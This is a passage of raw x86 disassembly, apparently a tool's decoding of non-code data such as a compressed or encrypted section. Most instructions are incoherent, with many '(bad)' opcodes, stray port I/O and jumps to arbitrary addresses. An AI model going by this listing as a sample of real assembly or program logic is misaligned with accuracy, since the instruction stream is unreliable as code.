  431259:	aad    0x96
  43125b:	(bad)  
  43125c:	in     al,dx
  43125d:	outs   dx,BYTE PTR ds:[esi]
  43125e:	xor    ecx,eax
  431260:	or     al,bl
  431262:	test   BYTE PTR [ebp+0x421fd9e0],cl
  431268:	xor    al,0x28
  43126a:	test   DWORD PTR ds:0x423a83b2,eax
  431270:	nop
  431271:	(bad)  
  431272:	inc    BYTE PTR [ecx-0x6f]
  431275:	mov    edx,eax
  431277:	mov    dh,0xdb
  431279:	ret    0xe043
  43127c:	loopne 0x43124f
  43127e:	into   
  43127f:	cmc    
  431280:	test   al,0xae
  431282:	inc    ebx
  431283:	inc    esp
  431284:	in     al,dx
  431285:	add    edi,edx
  431287:	enter  0x7ac4,0x2c
  43128b:	push   ds
  43128c:	je     0x431296
  43128e:	sub    eax,0x8d089211
  431293:	(bad)  
  431294:	in     al,dx
  431295:	test   bl,bh
  431297:	push   es
  431298:	adc    DWORD PTR [ebx],eax
  43129a:	mov    dh,0x2d
  43129c:	dec    esp
  43129d:	mov    ecx,0x90d2efb
  4312a2:	popa   
  4312a3:	pusha  
  4312a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4312a5:	add    esi,DWORD PTR [edx]
  4312a7:	fcomp  DWORD PTR [ebp+0x19]
  4312aa:	jmp    0x46bbc2
  4312af:	add    BYTE PTR [eax],al
  4312b1:	add    BYTE PTR [eax],al
  4312b3:	lods   al,BYTE PTR es:[esi]
  4312b5:	out    0x12,al
  4312b7:	mov    ds,ecx
  4312b9:	mov    ecx,0xa38faa7a
  4312be:	repz sub al,BYTE PTR [ecx+0x7b]
  4312c2:	sti    
  4312c3:	outs   dx,DWORD PTR ds:[esi]
  4312c4:	mov    bh,0xd8
  4312c6:	fldcw  WORD PTR [edi+0x41]
  4312c9:	call   FWORD PTR [esi]
  4312cb:	in     al,dx
  4312cc:	xor    BYTE PTR [ebx-0x3d],0x77
  4312d0:	fisttp WORD PTR [ebx]
  4312d2:	ds das 
  4312d4:	add    eax,0xd141248d
  4312d9:	dec    esi
  4312da:	(bad)  
  4312db:	sbb    eax,0x1af4fb09
  4312e0:	cmovo  ebp,ecx
  4312e3:	std    
  4312e4:	xor    BYTE PTR [ebx-0x1b],0x6
  4312e8:	add    ah,bh
  4312ea:	fnstcw WORD PTR [edx+eax*1]
  4312ed:	push   ebx
  4312ee:	push   ss
  4312ef:	loop   0x4312c4
  4312f1:	cli    
  4312f2:	sbb    al,0x9
  4312f4:	cmp    al,0x74
  4312f6:	icebp  
  4312f7:	mov    ebx,0xd3a92d53
  4312fc:	ficom  DWORD PTR [esi+0x2c]
  4312ff:	mov    bh,0xd
  431301:	add    BYTE PTR [edi],bl
  431303:	sub    bh,BYTE PTR ds:0xf0ed7263
  431309:	(bad)  
  43130a:	call   0xdd909c85
  43130f:	pop    edi
  431310:	iret   
  431311:	adc    esi,DWORD PTR [edx-0x5c]
  431314:	call   0x4314d1
  431319:	add    BYTE PTR [eax],al
  43131b:	add    BYTE PTR [ecx+0x2],dh
  43131e:	add    BYTE PTR [edx],bl
  431320:	xor    dh,al
  431322:	mov    edi,0x7ba36a7d
  431327:	jmp    0x4312bb
  431329:	loop   0x4312eb
  43132b:	cs jne 0x43136f
  43132e:	repnz dec ebx
  431330:	inc    esi
  431331:	cmp    dl,0x92
  431334:	jmp    0x8710:0xb47265c6
  43133b:	sti    
  43133c:	lods   eax,DWORD PTR ds:[esi]
  43133d:	pop    ecx
  43133e:	pop    edx
  43133f:	mov    bh,0x37
  431341:	(bad)  
  431342:	xchg   ch,bh
  431344:	hlt    
  431345:	sub    al,0x13
  431347:	add    BYTE PTR [esp+ecx*4+0x626bfff5],al
  43134e:	xor    bl,dh
  431350:	(bad)  
  431352:	test   eax,eax
  431354:	loope  0x43135e
  431356:	sub    al,al
  431358:	and    eax,0x5cffff3a
  43135d:	(bad)  
  43135e:	inc    ebx
  43135f:	or     BYTE PTR [ebp+0x73],cl
  431362:	sbb    DWORD PTR ds:0x3a3480,0x6a0b5793
  43136c:	sbb    al,0xcf
  43136e:	leave  
  43136f:	mov    ds:0x39ee20,eax
  431374:	xchg   ecx,eax
  431375:	(bad)  
  431376:	loope  0x4313a3
  431378:	fs scas al,BYTE PTR es:[edi]
  43137a:	mov    BYTE PTR [eax+0x1c],al
  43137d:	mov    ebx,0xe8f2
  431382:	add    BYTE PTR [eax],al
  431384:	add    BYTE PTR [ebp-0x68000a30],bh
  43138a:	(bad)  
  43138d:	lahf   
  43138e:	push   es
  43138f:	push   eax
  431390:	push   0x3ac044
  431395:	hlt    
  431396:	xabort 0xff
  431399:	dec    ebx
  43139a:	mov    ecx,0x413a340b
  43139f:	cli    
  4313a0:	dec    edi
  4313a1:	and    al,0xbd
  4313a3:	in     al,dx
  4313a4:	std    
  4313a5:	sub    ecx,DWORD PTR [edx+0x11d375ba]
  4313ab:	shr    cl,0xf6
  4313ae:	push   es
  4313af:	add    BYTE PTR [eax],al
  4313b1:	add    al,cl
  4313b3:	jae    0x4313a1
  4313b5:	and    al,0x90
  4313b7:	cli    
  4313b8:	dec    DWORD PTR [ebx+ebx*8-0x32a4dc3f]
  4313bf:	add    esi,0x33c9cecc
  4313c5:	jne    0x4313df
  4313c7:	mov    eax,ds:0xfe6c9b3b
  4313cc:	cmp    bh,BYTE PTR ss:[eax]
  4313cf:	adc    BYTE PTR [ebp+esi*2-0x577901d7],0xc1
  4313d7:	in     eax,dx
  4313d8:	aas    
  4313d9:	jne    0x43135c
  4313db:	xchg   BYTE PTR [ecx-0x551d64b],cl
  4313e1:	and    edx,ecx
  4313e3:	cmp    ecx,DWORD PTR [ecx+0x344b29b5]
  4313e9:	add    BYTE PTR [eax],al
  4313eb:	add    BYTE PTR [eax],al
  4313ed:	add    BYTE PTR [ecx+0x6f],bh
  4313f0:	mov    edi,0x29e8d7ff
  4313f5:	ds jne 0x431378
  4313f8:	xor    al,0x67
  4313fa:	inc    ecx
  4313fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4313fc:	mov    esi,0xa361bff
  431401:	fidiv  DWORD PTR [esi+0x2b439f29]
  431407:	in     al,dx
  431408:	add    edi,ebx
  43140a:	sub    eax,DWORD PTR [ecx]
  43140c:	dec    esp
  43140d:	mov    DWORD PTR [ebp-0x4ecbb4d7],esi
  431413:	addr16 mov edi,0x29f117ff
  431419:	ds jne 0x4313d4
  43141c:	xor    al,0x67
  43141e:	imul   esp,eax,0x1dd3ffbe
  431424:	adc    dl,bl
  431426:	sub    DWORD PTR ss:[edi-0x1945cb5],ebx
  43142d:	cli    
  43142e:	mov    ds:0x358ae640,eax
  431433:	sub    DWORD PTR [ebx+0x34],ecx
  431436:	imul   ebx,DWORD PTR [edi],0x98d7ffc0
  43143c:	sub    al,0x3e
  43143e:	jne    0x431430
  431440:	xor    al,0x9e
  431442:	sub    DWORD PTR [edx],eax
  431444:	inc    ebx
  431445:	ror    BYTE PTR [edx-0x633c2407],0xc2
  43144c:	call   0xcc3c8727
  431451:	mov    DWORD PTR [eax],0x0
  431457:	dec    esp
  431458:	ret    0xd7e8
  43145b:	cmp    bl,0xbb
  43145e:	mov    ebx,0xd7e8c23c
  431463:	push   0xfffffffb
  431465:	stos   DWORD PTR es:[edi],eax
  431466:	mov    bl,0x2c
  431468:	ret    0xcfe8
  43146b:	jb     0x431466
  43146d:	mov    eax,ds:0xe77276d0
  431472:	pop    esi
  431473:	cmp    ah,dh
  431475:	test   al,0xaa
  431477:	iret   
  431478:	fldcw  WORD PTR [edi+0x16027646]
  43147e:	jg     0x4314ca
  431480:	add    ch,0x5
  431483:	mov    al,ds:0x63e7c112
  431488:	cmp    eax,0xb6ca80a1
  43148d:	loope  0x431415
  43148f:	jno    0x431473
  431491:	mov    dl,0xc7
  431493:	cli    
  431494:	add    dh,BYTE PTR [ebx]
  431496:	mov    bl,0x2f
  431498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431499:	mov    ds:0x207feac7,al
  43149e:	sub    ah,BYTE PTR [ebx-0x4bcd7efe]
  4314a4:	cmp    al,0x69
  4314a6:	stos   DWORD PTR es:[edi],eax
  4314a7:	repz mov edx,0xdfcac742
  4314ad:	arpl   WORD PTR [ecx+ecx*2+0x6],ax
  4314b1:	pop    ss
  4314b2:	inc    esp
  4314b3:	and    eax,DWORD PTR [ecx+0x63]
  4314b6:	das    
  4314b7:	sub    DWORD PTR [eax],ecx
  4314b9:	shr    DWORD PTR [ebx+0x0],1
  4314bc:	add    BYTE PTR [eax],al
  4314be:	add    BYTE PTR [eax],al
  4314c0:	enter  0xe8c1,0x5b
  4314c4:	pop    eax
  4314c5:	imul   edi,edi,0x36
  4314c8:	cs and eax,0x383e13af
  4314ce:	cmp    ebp,ebx
  4314d0:	mov    al,ds:0x6884e726
  4314d5:	cmp    edx,edi
  4314d7:	dec    ebx
  4314d8:	add    DWORD PTR [edi+0x3e],ebx
  4314db:	jmp    0xd9b792d2
  4314e0:	into   
  4314e1:	call   0x7a03:0xf9affed5
  4314e8:	pushf  
  4314e9:	ins    DWORD PTR es:[edi],dx
  4314ea:	std    
  4314eb:	dec    edx
  4314ec:	leave  
  4314ed:	pop    edi
  4314ee:	ds jmp 0xe5b768e9
  4314f4:	jp     0x431532
  4314f6:	jo     0x43148e
  4314f8:	out    0x1,al
  4314fa:	push   edi
  4314fb:	stos   BYTE PTR es:[edi],al
  4314fc:	dec    esi
  4314fd:	in     eax,dx
  4314fe:	fldcw  WORD PTR [edx]
  431500:	jno    0x4314a6
  431502:	cli    
  431503:	rol    edi,1
  431505:	in     eax,dx
  431506:	cli    
  431507:	mov    dh,0xd3
  431509:	loopne 0x4314e4
  43150b:	sub    bh,BYTE PTR [ecx-0x79]
  43150e:	mov    edi,0xfad1561d
  431513:	fldcw  WORD PTR [edi+0x36f94416]
  431519:	cmp    eax,0x588e4a4a
  43151e:	ds jmp 0x2b1cf635
  431524:	add    BYTE PTR [eax],al
  431526:	add    BYTE PTR [eax],al
  431528:	add    BYTE PTR [ecx+0x39],bh
  43152b:	das    
  43152c:	sbb    BYTE PTR ss:[eax+0x3e],0xe9
  431531:	mov    al,0x3e
  431533:	push   edx
  431534:	push   ecx
  431535:	add    ecx,DWORD PTR [edx-0x6]
  431538:	pop    esi
  431539:	out    0x1,al
  43153b:	pop    ebx
  43153c:	sub    ah,BYTE PTR [eax+0x42]
  43153f:	mov    esi,0x802933b4
  431544:	add    BYTE PTR [eax+0x39],al
  431547:	cld    
  431548:	dec    DWORD PTR [edx+edx*8+0x518d0843]
  43154f:	push   ds
  431550:	push   0x39eb1c
  431555:	out    0x0,al
  431557:	call   0xf60e55f3
  43155c:	test   BYTE PTR [edx+edx*2-0x2],cl
  431560:	xor    DWORD PTR [esp+ebx*8-0x601b97cc],ebx
  431567:	cmp    DWORD PTR [eax],eax
  431569:	push   es
  43156a:	push   es
  43156b:	call   0xf60c95f3
  431570:	test   BYTE PTR [ebx+ecx*2+0x15868e6],bl
  431577:	add    BYTE PTR [eax],al
  431579:	sar    DWORD PTR [ebx-0x35dc020e],1
  43157f:	dec    edx
  431580:	push   0x1c
  431582:	retf   
  431583:	adc    ebp,eax
  431585:	dec    esi
  431586:	inc    eax
  431587:	cli    
  431588:	mov    WORD PTR [ecx+0xfffbce],ss
  43158e:	add    BYTE PTR [eax],al
  431590:	add    BYTE PTR [eax],al
  431592:	jecxz  0x431603
  431594:	loop   0x431613
  431596:	lahf   
  431597:	leave  
  431598:	cmc    
  431599:	test   esp,ebx
  43159b:	gs jbe 0x43157c
  43159e:	dec    edi
  43159f:	push   es
  4315a0:	pop    es
  4315a1:	xchg   ebp,eax
  4315a2:	int3   
  4315a3:	idiv   DWORD PTR [esp+eax*1-0x137e9324]
  4315aa:	pop    ebp
  4315ab:	ficom  DWORD PTR [edx-0x120033fc]
  4315b1:	inc    ebp
  4315b2:	aam    0x0
  4315b4:	dec    ebx
  4315b5:	push   esi
  4315b6:	imul   edi,DWORD PTR [ecx],0x7e
  4315b9:	xchg   ah,bl
  4315bb:	(bad)  
  4315bc:	(bad)  
  4315bd:	jg     0x431620
  4315bf:	mov    dh,0xdc
  4315c1:	inc    ebx
  4315c2:	jne    0x4315ed
  4315c4:	std    
  4315c5:	or     bh,bl
  4315c7:	fld    QWORD PTR [ebx]
  4315c9:	add    BYTE PTR [ebp+0x38],dh
  4315cc:	sub    ebp,DWORD PTR [esi]
  4315ce:	mov    ds:0xe5827b43,al
  4315d3:	fs mov esi,0xdbb701ff
  4315d9:	test   BYTE PTR [edx+0x54c25be4],0x1c
  4315e0:	dec    ecx
  4315e1:	mov    eax,?
  4315e3:	adc    DWORD PTR [ebx-0x6],eax
  4315e6:	jb     0x431661
  4315e8:	adc    eax,eax
  4315ea:	lds    ebx,FWORD PTR [ecx+0x6c1db247]
  4315f0:	mov    esi,0xe934aaff
  4315f5:	push   edi
  4315f6:	add    BYTE PTR [eax],al
  4315f8:	add    BYTE PTR [eax],al
  4315fa:	add    BYTE PTR [esi+0x69],ah
  4315fd:	inc    BYTE PTR [ebp+esi*1+0x3b871cde]
  431604:	stc    
  431605:	jb     0x43158b
  431607:	cmp    eax,0xc5fa4756
  43160c:	stc    
  43160d:	pop    ebx
  43160e:	cmovs  eax,DWORD PTR [ebx+0x47]
  431612:	test   BYTE PTR ds:0x60faf0f5,dh
  431618:	cmc    
  431619:	and    eax,0x79de753e
  43161e:	test   DWORD PTR [eax],0x24f4764
  431624:	ss sahf 
  431626:	or     eax,0xbf7929b5
  43162b:	imul   esp,DWORD PTR [eax],0xe879c283
  431631:	test   dl,bh
  431633:	dec    ecx
  431634:	aaa    
  431635:	push   0x2d0091e6
  43163a:	or     edi,esi
  43163c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43163d:	mov    cl,BYTE PTR [edx+0x35]
  431640:	add    ch,cl
  431642:	cli    
  431643:	jns    0x431627
  431645:	cmp    al,ah
  431647:	mov    edx,0x7951f527
  43164c:	loop   0x431678
  43164e:	les    ebp,FWORD PTR [edx-0xa0242ff]
  431654:	or     al,0x9
  431656:	sub    bl,BYTE PTR [ebx+0x2]
  431659:	dec    ecx
  43165a:	clc    
  43165b:	xchg   edx,eax
  43165c:	cmp    cl,BYTE PTR [ecx+0xa9]
  431662:	add    BYTE PTR [eax],al
  431664:	fiadd  DWORD PTR [eax]
  431666:	mov    esi,0xe905c03a
  43166b:	scas   al,BYTE PTR es:[edi]
  43166c:	repz sub eax,0x865767
  431672:	jmp    0x9a13d07a
  431677:	jl     0x43161a
  431679:	loop   0x431651
  43167b:	ret    
  43167c:	pop    edx
  43167d:	mov    ds:0x2933128,al
  431682:	jmp    0x9224:0x4e5d9b2f
  431689:	inc    edx
  43168a:	xor    eax,0x254e4a86
  43168f:	add    al,0xc7
  431691:	mov    ebp,ebx
  431693:	pop    DWORD PTR [esi+eax*8-0x18]
  431697:	fld    QWORD PTR [ebx]
  431699:	ja     0x43162d
  43169b:	ret    
  43169c:	sbb    ah,BYTE PTR [eax-0x39db737b]
  4316a2:	call   0xbab58023
  4316a7:	ret    
  4316a8:	add    bh,BYTE PTR [ecx]
  4316aa:	repz mov bl,0x64
  4316ad:	ret    0x82e8
  4316b0:	mov    dh,0x6
  4316b2:	xor    eax,DWORD PTR [edi-0x39]
  4316b5:	xchg   DWORD PTR [ebx],edi
  4316b7:	pop    eax
  4316b8:	fnstsw WORD PTR [ecx]
  4316ba:	jns    0x431718
  4316bc:	or     al,0xcd
  4316be:	push   DWORD PTR [esi+0x3a]
  4316c1:	cmp    BYTE PTR [edi],0xed
  4316c4:	pop    ss
  4316c5:	or     cl,ah
  4316c7:	stos   BYTE PTR es:[edi],al
  4316c8:	add    BYTE PTR [eax],al
  4316ca:	add    BYTE PTR [eax],al
  4316cc:	add    BYTE PTR [esi+0x7b],dh
  4316cf:	jmp    0x87458dbc
  4316d4:	das    
  4316d5:	xor    DWORD PTR [ecx],edx
  4316d7:	inc    eax
  4316d8:	mov    al,ds:0x7c8c2fc5
  4316dd:	dec    edi
  4316de:	xor    dl,bh
  4316e0:	cmp    DWORD PTR ds:[ebx-0x1c5c8bb],ecx
  4316e7:	lods   eax,DWORD PTR ds:[esi]
  4316e8:	call   0xfda91963
  4316ed:	(bad)  
  4316ee:	enter  0x948c,0x46
  4316f2:	mov    eax,0xbfd116c7
  4316f7:	jg     0x431707
  4316f9:	mov    dl,0x7e
  4316fb:	mov    edi,0xc1804d87
  431700:	cdq    
  431701:	ds sbb edi,0x848776aa
  431708:	and    DWORD PTR [esp+edi*1+0x1da139fa],edi
  43170f:	(bad)  
  431711:	mov    bl,0x7e
  431713:	mov    edi,0x3579a5e6
  431718:	stos   BYTE PTR es:[edi],al
  431719:	inc    ebp
  43171a:	or     ch,BYTE PTR [edi]
  43171c:	test   eax,0xb1848a40
  431721:	lods   eax,DWORD PTR ds:[esi]
  431722:	cmp    al,0xfa
  431724:	jo     0x4316ce
  431726:	add    al,BYTE PTR [eax]
  431728:	jmp    0xa31895ba
  43172d:	mov    ebx,0x1873c
  431732:	add    BYTE PTR [eax],al
  431734:	add    BYTE PTR [eax],al
  431736:	xor    edx,ecx
  431738:	je     0x4316cd
  43173a:	into   
  43173b:	je     0x4316c3
  43173d:	sub    DWORD PTR [ecx-0x79],esi
  431740:	test   BYTE PTR [eax],al
  431742:	and    al,0xca
  431744:	cmc    
  431745:	(bad)  
  431746:	jl     0x431709
  431748:	adc    ebx,DWORD PTR [eax-0x7d05bb53]
  43174e:	imul   eax,esi,0x5aff53f5
  431754:	stc    
  431755:	push   edx
  431756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431757:	std    
  431758:	add    BYTE PTR [si-0x7ffc],bl
  43175d:	lea    edx,[ecx]
  43175f:	std    
  431760:	sti    
  431761:	(bad)  
  431762:	cmp    esi,DWORD PTR [ebp-0x43]
  431765:	inc    ebp
  431766:	pop    eax
  431767:	mov    edi,0xbf9cffff
  43176c:	adc    eax,DWORD PTR [eax-0x52]
  43176f:	inc    esp
  431770:	cli    
  431771:	mov    bl,BYTE PTR [esp+eax*4-0x8]
  431775:	jmp    eax
  431777:	pop    ss
  431778:	dec    ebx
  431779:	lea    esp,[ecx]
  43177b:	ror    BYTE PTR [edx-0x1],0x1
  43177f:	ror    BYTE PTR [ebx-0xa355b7b],0xff
  431786:	cld    
  431787:	gs cmc 
  431789:	adc    eax,0x3a3220
  43178e:	rol    ebx,1
  431790:	outs   dx,BYTE PTR ds:[esi]
  431791:	push   es
  431792:	(bad)  
  431793:	ja     0x43178b
  431795:	mov    DWORD PTR [ecx+0xff50c6],edx
  43179b:	add    BYTE PTR [eax],al
  43179d:	add    BYTE PTR [eax],al
  43179f:	xor    DWORD PTR [eax],edi
  4317a1:	or     DWORD PTR [eax+0x1c],eax
  4317a4:	mov    ebx,0xc68ff843
  4317a9:	cmc    
  4317aa:	je     0x4317bc
  4317ac:	pushf  
  4317ad:	push   DWORD PTR [ebx+0x1e]
  4317b0:	adc    eax,eax
  4317b2:	shl    DWORD PTR [edx+edx*1],1
  4317b5:	leave  
  4317b6:	test   WORD PTR [edx-0x422637bd],di
  4317bd:	cmc    
  4317be:	lea    esi,[ebp-0x5a]
  4317c1:	cmp    edi,esp
  4317c3:	jmp    0x447f:0xd5175b88
  4317ca:	mov    eax,?
  4317cc:	jno    0x431810
  4317ce:	cli    
  4317cf:	rol    BYTE PTR [ecx-0x5735f828],cl
  4317d5:	fist   DWORD PTR [ebx-0x77019355]
  4317db:	pop    eax
  4317dc:	mov    ecx,0xa2753e29
  4317e1:	loop   0x43178e
  4317e3:	ret    
  4317e4:	ins    BYTE PTR es:[edi],dx
  4317e5:	(bad)  
  4317e6:	cli    
  4317e7:	retf   0x40d1
  4317ea:	fstp   QWORD PTR [edx+0xc2bdbf8]
  4317f0:	imul   edi,esi,0xf08d60fa
  4317f6:	aas    
  4317f7:	jne    0x43181d
  4317f9:	aas    
  4317fa:	jae    0x431868
  4317fc:	mov    ah,0x4b
  4317fe:	out    0xc9,eax
  431800:	test   BYTE PTR [edx+edi*8+0x0],0x0
  431805:	add    BYTE PTR [eax],al
  431807:	add    BYTE PTR [esi+0x2b],bl
  43180a:	adc    al,al
  43180c:	lahf   
  43180d:	in     al,dx
  43180e:	iret   
  43180f:	add    dh,dh
  431811:	and    eax,0x29b6c652
  431816:	std    
  431817:	out    0x51,eax
  431819:	sbb    eax,DWORD PTR [ebp-0x6]
  43181c:	mov    ds:0x9e0093bf,al
  431821:	jb     0x431862
  431823:	push   esp
  431824:	(bad)  
  431825:	cmp    al,0x7f
  431827:	jecxz  0x431856
  431829:	stos   BYTE PTR es:[edi],al
  43182a:	push   edx
  43182b:	inc    ebx
  43182c:	jp     0x431857
  43182e:	dec    BYTE PTR [esi-0x3d]
  431831:	adc    BYTE PTR [ecx],dl
  431833:	xlat   BYTE PTR ds:[ebx]
  431834:	(bad)  
  431835:	jno    0x4318b6
  431837:	loop   0x4318ad
  431839:	mov    ds:0x27123b2,al
  43183e:	jo     0x431826
  431840:	jbe    0x43185f
  431842:	and    eax,0x60006804
  431847:	out    0x8a,al
  431849:	pop    eax
  43184a:	and    eax,0xba2a4404
  43184f:	dec    eax
  431850:	fbstp  TBYTE PTR [esi]
  431852:	fs inc ebx
  431854:	dec    ecx
  431855:	push   DWORD PTR [esi-0x183c22bd]
  43185b:	add    esi,DWORD PTR [ebp-0x2d]
  43185e:	rol    BYTE PTR [ebx],1
  431860:	jne    0x43186c
  431862:	jmp    0x54fc817
  431867:	repz push 0x2
  43186a:	xchg   BYTE PTR [ebx],ch
  43186c:	add    BYTE PTR [eax],al
  43186e:	add    BYTE PTR [eax],al
  431870:	add    ah,al
  431872:	ret    0x8e8
  431875:	fisubr DWORD PTR [ebp+edx*8-0x289d96bc]
  43187c:	ret    
  43187d:	mov    ah,BYTE PTR [ebx+0x10]
  431880:	sub    eax,0xe6710243
  431885:	mov    bl,0x4a
  431887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431888:	add    ebx,DWORD PTR [edx-0x2]
  43188b:	sub    bh,dh
  43188d:	xor    ecx,DWORD PTR [edx-0x5b]
  431890:	add    esi,DWORD PTR [eax+ebp*4-0xc]
  431894:	mov    edx,DWORD PTR [edx]
  431896:	pop    eax
  431897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431898:	add    ebp,DWORD PTR [edx+ecx*4+0xb0a80d0]
  43189f:	mov    al,ds:0x1b8a4ace
  4318a4:	in     al,0x68
  4318a6:	ret    0xabe8
  4318a9:	jp     0x4318ff
  4318ab:	and    eax,0x404d2e04
  4318b0:	pop    eax
  4318b1:	cmp    eax,edx
  4318b3:	call   0x24cb5cfa
  4318b8:	call   0x4142eb3f
  4318bd:	jae    0x4318f3
  4318bf:	cli    
  4318c0:	jmp    0xb32f2fb6
  4318c5:	xor    dh,BYTE PTR [esi]
  4318c7:	stc    
  4318c8:	hlt    
  4318c9:	dec    esi
  4318ca:	push   cs
  4318cb:	inc    eax
  4318cc:	jmp    0xdd66dacc
  4318d1:	mov    ss,WORD PTR [edi-0xa]
  4318d4:	xchg   BYTE PTR [eax],al
  4318d6:	add    BYTE PTR [eax],al
  4318d8:	add    BYTE PTR [eax],al
  4318da:	cmp    DWORD PTR ss:[edi-0x913070b],0x4ec4d3fc
  4318e5:	add    edi,DWORD PTR [eax-0x56]
  4318e8:	push   edi
  4318e9:	inc    edi
  4318ea:	mov    dl,0x35
  4318ec:	stc    
  4318ed:	hlt    
  4318ee:	stos   BYTE PTR es:[edi],al
  4318ef:	adc    al,BYTE PTR [eax-0x17]
  4318f2:	repz push es
  4318f4:	add    BYTE PTR [edx+edi*4+0x35],al
  4318f8:	stc    
  4318f9:	mov    dh,BYTE PTR ds:0x93e93e21
  4318ff:	je     0x43190b
  431901:	ins    DWORD PTR es:[edi],dx
  431902:	stos   BYTE PTR es:[edi],al
  431903:	cmp    dl,bh
  431905:	cs push ecx
  431907:	fdiv   st(3),st
  431909:	es cmp DWORD PTR ss:[edi-0x5350512],0x7338b616
  431915:	lds    esi,FWORD PTR [edx+0x2a]
  431918:	pop    eax
  431919:	add    eax,0x298338b6
  43191e:	data16 jle 0x43195d
  431921:	div    BYTE PTR [edi-0x712b05c8]
  431927:	adc    al,BYTE PTR [eax-0x17]
  43192a:	rcl    DWORD PTR [ecx-0x1286d523],cl
  431930:	neg    BYTE PTR [eax+eax*2+0x7c]
  431934:	adc    al,0x15
  431936:	xchg   edi,eax
  431937:	hlt    
  431938:	(bad)  
  431939:	inc    DWORD PTR [edi+edx*2-0x1f]
  43193d:	std    
  43193e:	add    BYTE PTR [eax],al
  431940:	add    BYTE PTR [eax],al
  431942:	add    bl,dl
  431944:	xor    edi,DWORD PTR [ecx-0x8eb67f1]
  43194a:	call   ebx
  43194c:	and    eax,DWORD PTR [ebx]
  43194e:	xor    al,0x32
  431950:	cmp    al,0xfa
  431952:	mov    ds:0x39dd14,al
  431957:	(bad)  
  431958:	repz jae 0x43198a
  43195b:	inc    ecx
  43195c:	mov    ch,0x1e
  43195e:	mov    al,ds:0xe80000cd
  431963:	dec    ebp
  431964:	cld    
  431965:	(bad)  
  431966:	jmp    FWORD PTR [edi-0x6d]
  431969:	jle    0x43198f
  43196b:	adc    DWORD PTR [ebx],ecx
  43196d:	add    BYTE PTR [eax],al
  43196f:	cld    
  431970:	mov    edi,0x3c722c33
  431975:	cli    
  431976:	mov    eax,0x39dcf4
  43197b:	mov    ah,0x98
  43197d:	fadd   QWORD PTR [ebx-0x74]
  431980:	mov    eax,0x7d2f930c
  431985:	loop   0x4319e1
  431987:	stc    
  431988:	ret    0xfff5
  43198b:	enter  0x61c,0xe8
  43198f:	(bad)
  431992:	(bad)  
  431993:	fdivr  DWORD PTR [edi-0x3e6f7bfb]
  431999:	cmc    
  43199a:	dec    DWORD PTR [edx+0x4e0c1e3b]
  4319a0:	ins    BYTE PTR es:[edi],dx
  4319a1:	std    
  4319a2:	out    0x81,eax
  4319a4:	repz cmc 
  4319a6:	inc    DWORD PTR [eax]
  4319a8:	add    BYTE PTR [eax],al
  4319aa:	add    BYTE PTR [eax],al
  4319ac:	ja     0x4319ab
  4319ae:	scas   eax,DWORD PTR es:[edi]
  4319af:	add    DWORD PTR [esi],eax
  4319b1:	mov    ebp,0x220c9505
  4319b6:	pop    eax
  4319b7:	pop    ebx
  4319b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4319b9:	fistp  DWORD PTR [ebx-0x3d]
  4319bc:	jne    0x4319b4
  4319be:	mov    ebx,gs
  4319c0:	idiv   BYTE PTR ds:0x3209803b
  4319c6:	push   es
  4319c7:	add    BYTE PTR [ebp+0xb],dh
  4319ca:	(bad)  [ecx+ecx*8+0x2fda405]
  4319d1:	sub    ah,BYTE PTR [esi]
  4319d3:	xor    BYTE PTR [esi+0x29],0xfe
  4319d7:	mov    WORD PTR [ecx+0x3d],gs
  4319da:	mov    ah,0xe7
  4319dc:	sub    ch,ah
  4319de:	cmp    eax,0x25a9eefa
  4319e3:	add    BYTE PTR [ebp+0x29],dh
  4319e6:	lods   al,BYTE PTR ds:[esi]
  4319e7:	std    
  4319e8:	add    DWORD PTR [esi+0x2973fce7],esp
  4319ee:	(bad)  
  4319ef:	push   eax
  4319f0:	ret    0x62e
  4319f3:	lea    ebp,[ecx]
  4319f5:	add    eax,0xc80d6818
  4319fa:	(bad)  
  4319fb:	call   DWORD PTR [edx-0x5d06983e]
  431a01:	xchg   edx,eax
  431a02:	sub    eax,0x8b297500
  431a07:	sar    DWORD PTR [ebx+0x3c3ffe29],0x76
  431a0e:	xor    eax,0x8c
  431a13:	add    BYTE PTR [eax],al
  431a15:	cmp    ebp,edi
  431a17:	or     edx,DWORD PTR [eax+0xf]
  431a1a:	sub    ah,BYTE PTR [esi-0x197aca9]
  431a20:	cli    
  431a21:	or     BYTE PTR [ecx+0x13],0x40
  431a25:	jne    0x4319c7
  431a27:	xor    eax,DWORD PTR [ebx+eiz*2+0x68fb18b5]
  431a2e:	and    eax,0x6e754013
  431a33:	ja     0x431a34
  431a35:	inc    edx
  431a36:	sub    DWORD PTR [ecx-0x1dfd5cf8],esi
  431a3c:	push   ss
  431a3d:	jns    0x431a4e
  431a3f:	sub    DWORD PTR [edx+ebx*2],eax
  431a42:	sub    al,0x31
  431a44:	lea    esi,[esp+edx*8]
  431a47:	pop    ebp
  431a48:	es mov ecx,0xa803ec40
  431a4e:	xchg   esp,ecx
  431a50:	test   BYTE PTR [esi],dl
  431a52:	cmp    ah,BYTE PTR [edi+0x2f]
  431a55:	(bad)  
  431a56:	cld    
  431a57:	call   0x24c8c05f
  431a5c:	call   0x52a44db
  431a61:	jne    0x431a65
  431a63:	xchg   edx,eax
  431a64:	mov    dh,0x72
  431a66:	xchg   DWORD PTR [ebx],ebx
  431a68:	adc    al,ch
  431a6a:	jge    0x431a38
  431a6c:	data16 jbe 0x431a71
  431a6f:	jmp    0xc52fea47
  431a74:	popa   
  431a75:	add    DWORD PTR [edx],0x5e
  431a78:	mov    BYTE PTR [eax],0x0
  431a7b:	add    BYTE PTR [eax],al
  431a7d:	add    BYTE PTR [edx-0x56],dh
  431a80:	and    BYTE PTR ds:0xaf510273,0xd6
  431a87:	xor    edx,DWORD PTR [ecx-0x20]
  431a8a:	sti    
  431a8b:	sbb    al,0xab
  431a8d:	inc    ebp
  431a8e:	outs   dx,BYTE PTR ds:[esi]
  431a8f:	add    bl,BYTE PTR [esp+ecx*4-0x54b38162]
  431a96:	and    al,0x33
  431a98:	mov    ebx,0x50bcf00f
  431a9d:	sar    DWORD PTR [edi-0x54],cl
  431aa0:	lock sub ebx,DWORD PTR [esi]
